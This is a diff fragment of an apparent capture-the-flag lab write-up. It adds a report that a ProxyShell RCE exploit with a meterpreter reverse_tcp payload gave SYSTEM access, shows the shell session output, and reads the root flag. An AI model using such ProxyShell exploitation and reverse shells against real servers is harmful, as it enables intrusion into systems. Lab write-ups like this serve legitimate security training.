@@ -288,5 +288,25 @@ Payload options (windows/x64/meterpreter/reverse_tcp):
    LPORT     5555             yes       The listen port
 ```
 
-`Proxyshell_rce` worked.
+It worked and now, I have access as `NT Authority\System`
 
+```bash
+meterpreter > shell
+Process 7132 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+nt authority\system
+```
+
+# Root Flag
+
+```powershell
+PS C:\root> type C:\Users\Administrator\Documents\flag.txt
+type C:\Users\Administrator\Documents\flag.txt
+THM{REDACTED}
+
+```
